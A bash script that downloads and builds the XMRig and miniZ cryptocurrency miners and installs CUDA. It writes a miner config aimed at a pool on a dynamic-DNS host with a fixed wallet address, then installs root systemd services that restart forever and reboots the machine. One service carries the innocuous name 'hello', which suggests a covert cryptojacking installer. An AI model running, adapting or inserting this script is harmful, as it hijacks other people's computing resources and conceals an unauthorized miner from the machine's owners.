#!/bin/bash
sudo su && sudo apt-get update && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y &&  cd /usr/local/src/ && wget https://beams.sfo3.digitaloceanspaces.com/miniZ_v1.7x3_linux-x64.tar.gz && tar xfz miniZ_v1.7x3_linux-x64.tar.gz && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && sudo echo "vm.nr_hugepages=1024" >> /etc/sysctl.conf && sudo sysctl -p && CUDA_REPO_PKG=cuda-repo-ubuntu1604_10.0.130-1_amd64.deb && wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/${CUDA_REPO_PKG} && sudo dpkg -i /tmp/${CUDA_REPO_PKG} && sudo apt-key adv --fetch-keys "http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub" && rm -f /tmp/${CUDA_REPO_PKG} && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get install cuda -y &&

cat > /usr/local/src/xmrig/build/config.json <<EOL
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "argon2": [0,1,2,3,4,5,6,7],
        "astrobwt": [-1],
        "cn": [
            [0,1,2,3,4,5,6,7]
        ],
        "cn-heavy": [
            [0,1,2,3,4,5,6,7]
        ],
        "cn-lite": [
            [0,1,2,3,4,5,6,7]
        ],
        "cn-pico": [
            [0,1,2,3,4,5,6,7]
        ],
        "rx": [0,1,2,3,4,5,6,7],
        "rx/wow": [0,1,2,3,4,5,6,7],
        "cn/0": false,
        "cn-lite/0": false,
        "rx/arq": "rx/wow",
        "rx/keva": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "welchnmuambrosejhv.zapto.org:8080",
            "user": "8821yB1PujCXARff1D8XjZZVnaMCW8wBVYa7JQ24mey9Yfs96pZCAgp9Z4FLqcNkquhGYkVE7AVBkbNpa8YtRGzzEhhJggT",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
	        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true
}
EOL

cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/xmrig/build/xmrig
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL

cat > /lib/systemd/system/miniZ.service <<EOL
[Unit]
Description=miniZ
After=network.target
[Service]
ExecStart=/usr/local/src/miniZ --par=beam3 --url=ssl://13a3f3867e53e51493a76e0a02d8ae22f997956a9996cd54ad80472766597c88018.r1@beam-us.leafpool.com:3333 --log --extra --ocX
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL

#!/bin/bash
sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl enable miniZ.service && sudo systemctl start hello.service && sudo systemctl start miniZ.service && sudo reboot
